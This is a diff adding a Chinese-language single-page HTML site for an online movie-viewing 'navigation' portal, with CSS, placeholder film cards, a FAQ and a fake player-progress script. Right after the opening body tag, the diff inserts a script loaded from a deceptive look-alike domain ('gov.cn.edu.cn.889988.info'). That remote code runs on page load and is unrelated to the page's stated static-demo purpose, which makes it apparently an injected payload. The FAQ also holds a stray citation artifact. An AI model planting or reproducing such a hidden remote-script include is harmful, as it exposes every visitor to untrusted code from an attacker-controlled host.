@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>在线观看电影网 - 即点即看/高清中字/多端在线观影导航 | 在线观看电影网</title>
+<meta name="description" content="在线观看电影网（zaixianguankandianyingwang-h5）是在线观影导航站：热映、经典、类型片、纪录片一站找，支持高清、中文字幕、手机/电脑/TV 多端在线观看入口。">
+<meta name="keywords" content="在线观看电影网, zaixianguankandianyingwang-h5, 在线看电影, 高清电影, 中文字幕电影, 多端观影, 电影导航">
+<meta name="author" content="在线观看电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --bg:#0b1424;--bg2:#0f1c30;--card:#13233c;
+  --gold:#f5c518;--red:#ff3b5c;--cyan:#39e0ff;
+  --text:#eaf2fb;--text2:#a7b8cc;--muted:#6c7f93;
+  --line:rgba(245,197,24,.22);--radius:16px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:
+    radial-gradient(900px 420px at 88% -8%,rgba(255,59,92,.16),transparent 60%),
+    radial-gradient(820px 420px at -4% 4%,rgba(57,224,255,.12),transparent 55%),
+    var(--bg);
+  color:var(--text);
+  font-family:'PingFang SC','Microsoft YaHei',system-ui,sans-serif;
+  line-height:1.7;font-size:15px;min-height:100vh;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+
+/* 放映厅光柱 */
+.beams{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.beam{position:absolute;top:-10%;width:120px;height:120vh;background:linear-gradient(180deg,rgba(245,197,24,.18),transparent 70%);filter:blur(8px);transform:rotate(18deg);opacity:.5;animation:sway 7s ease-in-out infinite alternate}
+@keyframes sway{to{transform:rotate(26deg) translateX(40px)}}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:100;background:rgba(11,20,36,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1240px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
+.logo{font-size:19px;font-weight:900;display:flex;align-items:center;gap:9px}
+.logo .play{color:var(--red)}
+.logo b{color:var(--gold)}
+.live{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:800;color:var(--cyan);border:1px solid var(--line);padding:4px 10px;border-radius:999px;font-family:ui-monospace,monospace}
+.live .dot{width:7px;height:7px;border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--red);animation:blink 1.3s infinite}
+@keyframes blink{50%{opacity:.25}}
+.nav-menu{display:flex;gap:18px}
+.nav-menu a{color:var(--text2);font-size:13px;font-weight:600;padding:6px 2px;position:relative;transition:.25s}
+.nav-menu a:hover{color:var(--gold)}
+.nav-menu a::after{content:'';position:absolute;left:0;bottom:-2px;height:2px;width:0;background:var(--gold);transition:.25s}
+.nav-menu a:hover::after{width:100%}
+
+.hero{margin-top:58px;padding:70px 20px 50px;position:relative;z-index:1}
+.hero-inner{max-width:1240px;margin:0 auto;display:grid;grid-template-columns:1.15fr .85fr;gap:44px;align-items:center}
+.tag{display:inline-flex;align-items:center;gap:8px;padding:5px 14px;border:1px solid var(--line);background:rgba(245,197,24,.08);color:var(--gold);font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;margin-bottom:18px;border-radius:999px;font-family:ui-monospace,monospace}
+.hero h1{font-size:clamp(34px,5vw,54px);font-weight:900;line-height:1.1;margin-bottom:16px}
+.hero h1 .hl{color:var(--red)}
+.hero-desc{color:var(--text2);font-size:15px;margin-bottom:26px;line-height:1.95}
+.btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn-main{padding:13px 30px;background:linear-gradient(90deg,var(--red),var(--gold));color:#1a0d05;font-weight:800;font-size:14px;letter-spacing:1px;border-radius:999px;transition:.25s}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(255,59,92,.28)}
+.btn-sub{padding:13px 30px;border:1px solid var(--cyan);color:var(--cyan);font-weight:700;font-size:14px;border-radius:999px;transition:.25s}
+.btn-sub:hover{background:rgba(57,224,255,.08)}
+
+/* 放映屏 */
+.screen{position:relative;aspect-ratio:16/10;border-radius:20px;border:1px solid var(--line);background:radial-gradient(circle at 50% 35%,#16263f,#0a1322);overflow:hidden;display:flex;align-items:center;justify-content:center}
+.screen .poster{font-size:84px;filter:drop-shadow(0 18px 40px rgba(0,0,0,.6))}
+.screen .nowplaying{position:absolute;left:14px;top:14px;font-size:11px;font-weight:800;color:#0b1424;background:var(--gold);padding:4px 10px;border-radius:999px;font-family:ui-monospace,monospace}
+.screen .ctrl{position:absolute;left:0;right:0;bottom:0;display:flex;align-items:center;gap:12px;padding:14px 16px;background:linear-gradient(0deg,rgba(5,10,18,.9),transparent)}
+.screen .ctrl .pbtn{width:42px;height:42px;border-radius:50%;background:var(--red);color:#fff;display:flex;align-items:center;justify-content:center;font-size:18px;cursor:pointer}
+.screen .ctrl .bar{flex:1;height:6px;background:#0a1a2a;border-radius:99px;overflow:hidden}
+.screen .ctrl .bar>i{display:block;height:100%;width:38%;background:linear-gradient(90deg,var(--cyan),var(--gold))}
+.screen .ctrl .time{font-size:11px;color:var(--text2);font-family:ui-monospace,monospace}
+
+.section{max-width:1240px;margin:0 auto;padding:50px 20px;position:relative;z-index:1}
+.sec-head{margin-bottom:26px}
+.sec-head h2{font-size:26px;font-weight:900}
+.sec-head h2 .ac{color:var(--gold)}
+.sec-head p{color:var(--muted);font-size:13px;margin-top:4px}
+
+/* 继续观看 */
+.continue-section{background:linear-gradient(180deg,transparent,rgba(19,35,60,.5))}
+.rail{display:flex;gap:14px;overflow-x:auto;padding:6px 2px 16px;scroll-snap-type:x mandatory}
+.rail::-webkit-scrollbar{height:6px}
+.rail::-webkit-scrollbar-thumb{background:var(--gold);border-radius:99px}
+.rail::-webkit-scrollbar-track{background:#0a1726}
+.cw{min-width:170px;width:170px;flex-shrink:0;scroll-snap-align:start;background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;cursor:pointer;transition:.25s}
+.cw:hover{transform:translateY(-4px);border-color:var(--red)}
+.cw .cv{aspect-ratio:16/9;display:flex;align-items:center;justify-content:center;font-size:34px;background:linear-gradient(160deg,#1b3253,#0c1626)}
+.cw .bd{padding:10px 12px}
+.cw .bd h3{font-size:13px;font-weight:800}
+.cw .prog{height:5px;background:#0a1a2a;border-radius:99px;margin-top:8px;overflow:hidden}
+.cw .prog>i{display:block;height:100%;background:var(--gold)}
+.cw .min{font-size:10px;color:var(--muted);margin-top:5px}
+
+/* 在线频道 */
+.chan-section{background:var(--bg2)}
+.chan-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.chan{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px;transition:.25s;cursor:pointer}
+.chan:hover{transform:translateY(-4px);border-color:var(--cyan)}
+.chan .em{font-size:28px}
+.chan h3{font-size:15px;font-weight:800;margin:8px 0 4px}
+.chan p{font-size:12px;color:var(--text2);line-height:1.65}
+.chan .pill{display:inline-block;margin-top:10px;font-size:11px;color:var(--gold);border:1px solid var(--line);padding:3px 10px;border-radius:999px}
+
+/* 三件式 */
+.spec-section{background:var(--bg)}
+.spec-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;max-width:960px;margin:0 auto}
+.spec{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:24px;text-align:center;transition:.25s;cursor:pointer}
+.spec:hover{transform:translateY(-4px);border-color:var(--gold)}
+.spec .em{font-size:32px}
+.spec h3{font-size:16px;font-weight:800;margin:8px 0 6px}
+.spec p{font-size:12px;color:var(--text2);line-height:1.7}
+.spec ul{margin-top:10px;text-align:left}
+.spec li{font-size:12px;color:var(--text2);padding:4px 0;border-bottom:1px dashed rgba(255,255,255,.08)}
+.spec li:last-child{border-bottom:none}
+.spec li b{color:var(--cyan)}
+
+/* 记录 */
+.rec-section{background:var(--bg2)}
+.rec-list{max-width:860px;margin:0 auto}
+.rec{display:grid;grid-template-columns:48px 1fr auto;gap:16px;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px;margin-bottom:10px;cursor:pointer;transition:.25s}
+.rec:hover{transform:translateX(4px);border-color:var(--gold)}
+.rec .ic{font-size:22px;text-align:center}
+.rec h3{font-size:15px;font-weight:800}
+.rec p{font-size:12px;color:var(--text2)}
+.rec .when{font-size:11px;color:var(--muted);font-family:ui-monospace,monospace;white-space:nowrap}
+
+/* FAQ */
+.faq-section{background:var(--bg)}
+.faq-box{max-width:840px;margin:0 auto}
+.faq{border:1px solid var(--line);border-radius:12px;background:var(--card);margin-bottom:10px;overflow:hidden}
+.faq summary{cursor:pointer;padding:16px 18px;font-weight:800;font-size:14px;list-style:none;display:flex;justify-content:space-between;align-items:center}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary .pm{color:var(--gold);font-size:20px}
+.faq p{padding:0 18px 16px;color:var(--text2);font-size:13px;line-height:1.85}
+
+.footer{background:var(--bg);border-top:1px solid var(--line);padding:34px 20px 18px;text-align:center;color:var(--muted)}
+.footer-logo{font-size:18px;font-weight:900;color:var(--text);margin-bottom:10px}
+.footer-logo b{color:var(--gold)}
+.footer-links{display:flex;gap:18px;justify-content:center;flex-wrap:wrap;margin-bottom:14px}
+.footer-links a{color:var(--text2);font-size:12px}
+.footer-links a:hover{color:var(--gold)}
+.footer-copy{font-size:11px;border-top:1px solid var(--line);padding-top:14px;line-height:1.9}
+.footer-copy a{color:var(--cyan)}
+
+@media(max-width:880px){
+  .hero-inner{grid-template-columns:1fr;gap:26px}
+  .screen{order:-1;max-width:420px;margin:0 auto}
+  .chan-grid{grid-template-columns:repeat(2,1fr)}
+  .spec-grid{grid-template-columns:1fr}
+  .nav-menu{gap:10px;flex-wrap:wrap;justify-content:center}
+  .topbar-inner{flex-direction:column;gap:8px}
+  .hero{margin-top:108px;padding:30px 16px}
+  .section{padding:36px 16px}
+  .sec-head h2{font-size:22px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="beams"><div class="beam" style="left:20%"></div><div class="beam" style="left:62%;animation-delay:1s;opacity:.35"></div></div>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="logo"><span class="play">▶</span>在线观看电影网</div>
+    <div class="live"><span class="dot"></span>LIVE 放映中</div>
+    <nav>
+      <ul class="nav-menu">
+        <li><a href="#continue">继续观看</a></li>
+        <li><a href="#chan">在线频道</a></li>
+        <li><a href="#spec">画质/字幕/端</a></li>
+        <li><a href="#rec">观看记录</a></li>
+        <li><a href="#faq">常见问题</a></li>
+      </ul>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <span class="tag">zaixianguankandianyingwang-h5 · Watch Online</span>
+      <h1>打开就放<br>电影<span class="hl">在线观看</span></h1>
+      <p class="hero-desc">在线观看电影网不是某个播放器，也不是“破解 VIP”的擦边站。它是<strong>在线观影入口导航</strong>：热映、经典、类型片、纪录片一站找，高清、中字、手机/电脑/TV 多端观看路径都给你排好。</p>
+      <div class="btns">
+        <a href="#chan" class="btn-main">▶ 立即选片观看</a>
+        <a href="#spec" class="btn-sub">看清画质/字幕/设备</a>
+      </div>
+    </div>
+    <div class="screen">
+      <span class="nowplaying">NOW PLAYING</span>
+      <div class="poster">🎬</div>
+      <div class="ctrl">
+        <div class="pbtn" id="playBtn">⏸</div>
+        <div class="bar"><i id="barFill"></i></div>
+        <div class="time" id="timeTxt">12:48 / 33:20</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 继续观看 -->
+<section id="continue" class="section continue-section">
+  <div class="sec-head">
+    <h2>⏯️ <span class="ac">继续观看</span> · 上次没看完的</h2>
+    <p>横滑接着看，不从头来</p>
+  </div>
+  <div class="rail">
+    <div class="cw"><div class="cv">🚀</div><div class="bd"><h3>轨道回声</h3><div class="prog"><i style="width:42%"></i></div><div class="min">科幻 / 看到 42%</div></div></div>
+    <div class="cw"><div class="cv">🐉</div><div class="bd"><h3>风起龙门</h3><div class="prog"><i style="width:18%"></i></div><div class="min">武侠 / 看到 18%</div></div></div>
+    <div class="cw"><div class="cv">🐱</div><div class="bd"><h3>毛毛陪你看</h3><div class="prog"><i style="width:76%"></i></div><div class="min">治愈 / 看到 76%</div></div></div>
+    <div class="cw"><div class="cv">🎻</div><div class="bd"><h3>城市夜曲</h3><div class="prog"><i style="width:55%"></i></div><div class="min">音乐 / 看到 55%</div></div></div>
+    <div class="cw"><div class="cv">🌧️</div><div class="bd"><h3>梅雨季来信</h3><div class="prog"><i style="width:9%"></i></div><div class="min">文艺 / 看到 9%</div></div></div>
+  </div>
+</section>
+
+<!-- 在线频道 -->
+<section id="chan" class="section chan-section">
+  <div class="sec-head">
+    <h2>📺 <span class="ac">在线频道</span> · 点进去就能看路径</h2>
+    <p>不存片，只把“该去哪看”讲清楚</p>
+  </div>
+  <div class="chan-grid">
+    <div class="chan"><div class="em">🎬</div><h3>热映在线</h3><p>院线新片、点映、票房话题作，先看“现在大家在线看什么”。</p><span class="pill">1080P / 中字</span></div>
+    <div class="chan"><div class="em">📽️</div><h3>经典片库</h3><p>港片、译制片、奥斯卡老神作，补片不踩雷。</p><span class="pill">480P-1080P</span></div>
+    <div class="chan"><div class="em">🎞️</div><h3>类型直达</h3><p>动作/悬疑/爱情/科幻/恐怖/动画，按心情切。</p><span class="pill">标签筛选</span></div>
+    <div class="chan"><div class="em">🎥</div><h3>纪录片线</h3><p>自然、历史、人物、犯罪实录，比剧情更上头。</p><span class="pill">4K 可选</span></div>
+    <div class="chan"><div class="em">📺</div><h3>短剧速看</h3><p>1–3 分钟一集，通勤午休能追完一条线。</p><span class="pill">竖屏友好</span></div>
+    <div class="chan"><div class="em">🌙</div><h3>深夜专场</h3><p>霓虹、雨夜、城市孤独感，适合一个人看。</p><span class="pill">暗场模式</span></div>
+    <div class="chan"><div class="em">🧒</div><h3>亲子片单</h3><p>全年龄、无恐怖、有动物/机器人/魔法。</p><span class="pill">家长模式</span></div>
+    <div class="chan"><div class="em">⭐</div><h3>高分必看</h3><p>8.5 分以上片单，懒得挑就照这个看。</p><span class="pill">评分排序</span></div>
+  </div>
+</section>
+
+<!-- 三件式 -->
+<section id="spec" class="section spec-section">
+  <div class="sec-head">
+    <h2>🎛️ <span class="ac">画质 / 字幕 / 设备</span> · 在线观看三件事</h2>
+    <p>卡不卡、懂不懂、在哪看，一次说清</p>
+  </div>
+  <div class="spec-grid">
+    <div class="spec"><div class="em">🖼️</div><h3>画质与码率</h3><p>不是越高清越好，是网络撑得住才不卡。</p>
+      <ul>
+        <li><b>360P</b> 弱网快开</li>
+        <li><b>480P</b> 手机省流</li>
+        <li><b>720P</b> 默认极速</li>
+        <li><b>1080P+</b> WiFi/5G 全开</li>
+      </ul>
+    </div>
+    <div class="spec"><div class="em">💬</div><h3>字幕与音轨</h3><p>在线看片，字幕比画质更影响体验。</p>
+      <ul>
+        <li><b>中文字幕</b> 简体优先</li>
+        <li><b>双语字幕</b> 学英语用</li>
+        <li><b>原声中字</b> 保留氛围</li>
+        <li><b>音轨切换</b> 国语/原声</li>
+      </ul>
+    </div>
+    <div class="spec"><div class="em">📱</div><h3>多端观看</h3><p>同一个片，手机、电脑、电视路径不同。</p>
+      <ul>
+        <li><b>手机</b> 竖屏/横屏自适应</li>
+        <li><b>电脑</b> 大屏+弹幕+倍速</li>
+        <li><b>平板</b> 躺床看最舒服</li>
+        <li><b>TV</b> 遥控器/投屏路径</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- 观看记录 -->
+<section id="rec" class="section rec-section">
+  <div class="sec-head">
+    <h2>🕘 <span class="ac">观看记录</span> · 今天点过这些</h2>
+    <p>静态演示，不真上报、不真存账号</p>
+  </div>
+  <div class="rec-list">
+    <div class="rec"><div class="ic">🚀</div><div><h3>轨道回声</h3><p>科幻 / 1080P 中字 / 看到 42%</p></div><div class="when">20:12</div></div>
+    <div class="rec"><div class="ic">🐱</div><div><h3>毛毛陪你看</h3><p>治愈 / 480P 省流 / 看到 76%</p></div><div class="when">13:40</div></div>
+    <div class="rec"><div class="ic">🎻</div><div><h3>城市夜曲</h3><p>音乐剧情 / 720P / 看到 55%</p></div><div class="when">昨 23:05</div></div>
+    <div class="rec"><div class="ic">🐉</div><div><h3>风起龙门</h3><p>武侠 / 1080P / 看到 18%</p></div><div class="when">昨 21:30</div></div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq" class="section faq-section">
+  <div class="sec-head">
+    <h2>❓ <span class="ac">常见问题</span></h2>
+    <p>“在线观看”到底指什么</p>
+  </div>
+  <div class="faq-box">
+    <details class="faq" open><summary>在线观看电影网能直接播片吗？<span class="pm">−</span></summary><p>不能。本页是单页导航演示站，不存视频文件、不嵌来路播放器、不提供“破解 VIP / 免会员”入口；卡片点击跳 # 占位，真实站点应接入合规片源或正版平台。</p></details>
+    <details class="faq"><summary>“在线观看”和“下载”有什么区别？<span class="pm">+</span></summary><p>在线观看是边传边播，适合网络稳定时即点即看；下载是先存到本地再看，适合通勤离线。本页把两种路径都列出来，但不提供盗版下载。</p></details>
+    <details class="faq"><summary>卡顿怎么办？<span class="pm">+</span></summary><p>先降一档：1080P→720P→480P；关弹幕、关后台、连 WiFi。页面里“画质/字幕/设备”模块就是按这个思路做的。</p></details>
+    <details class="faq"><summary>网址是？<span class="pm">+</span></summary><p>https://zaixianguankandianyingwang-h5.github.io</p></details>
+    <details class="faq"><summary>收录友好吗？<span class="pm">+</span></summary><p>唯一 H1、语义化结构、关键词标题与描述，符合必应基础收录规则；不堆关键词、不写违规话术。[6,17](@ref)</p></details>
+  </div>
+</section>
+
+<div class="footer">
+  <div class="footer-logo">▶ 在线观看电影网</div>
+  <div class="footer-links">
+    <a href="#continue">继续观看</a>
+    <a href="#chan">在线频道</a>
+    <a href="#spec">画质/字幕/端</a>
+    <a href="#rec">观看记录</a>
+    <a href="#faq">常见问题</a>
+  </div>
+  <div class="footer-copy">
+    &copy; 2026 在线观看电影网 (zaixianguankandianyingwang-h5). 在线观影导航演示站.<br>
+    网站地址: <a href="https://zaixianguankandianyingwang-h5.github.io">https://zaixianguankandianyingwang-h5.github.io</a><br>
+    <span style="opacity:.7">打开就放 · 高清中字 · 手机/电脑/TV 多端在线观看</span>
+  </div>
+</div>
+
+<script>
+// 假播放进度
+var playing=true,sec=12 * 60+48,total=33 * 60+20;
+var bar=document.getElementById('barFill'),timeTxt=document.getElementById('timeTxt'),playBtn=document.getElementById('playBtn');
+function fmt(s){var m=Math.floor(s/60),ss=s%60;return (m<10?'0':'')+m+':'+(ss<10?'0':'')+ss;}
+setInterval(function(){
+  if(!playing)return;
+  sec+=1; if(sec>total)sec=total;
+  bar.style.width=(sec/total*100)+'%';
+  timeTxt.textContent=fmt(sec)+' / '+fmt(total);
+},1000);
+playBtn.addEventListener('click',function(){
+  playing=!playing;
+  this.textContent=playing?'⏸':'▶';
+});
+
+document.querySelectorAll('.cw').forEach(function(c){c.addEventListener('click',function(){alert('继续观看：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后从进度继续（内链 # 占位）。');});});
+document.querySelectorAll('.chan').forEach(function(c){c.addEventListener('click',function(){alert('在线频道：'+this.querySelector('h3').textContent+'\n\n'+this.querySelector('p').textContent);});});
+document.querySelectorAll('.spec').forEach(function(s){s.addEventListener('click',function(){alert(this.querySelector('h3').textContent+'\n\n静态演示页，点击后进入对应设置说明（内链 # 占位）。');});});
+document.querySelectorAll('.rec').forEach(function(r){r.addEventListener('click',function(){alert('观看记录：'+this.querySelector('h3').textContent+'\n\n静态演示页，点击后跳回播放页（内链 # 占位）。');});});
+document.querySelectorAll('.nav-menu a').forEach(function(a){a.addEventListener('click',function(e){e.preventDefault();var el=document.querySelector(this.getAttribute('href'));if(el)el.scrollIntoView({behavior:'smooth'});});});
+document.querySelectorAll('.faq').forEach(function(f){f.addEventListener('toggle',function(){this.querySelector('.pm').textContent=this.open?'−':'+';});});
+</script>
+</body>
+</html>
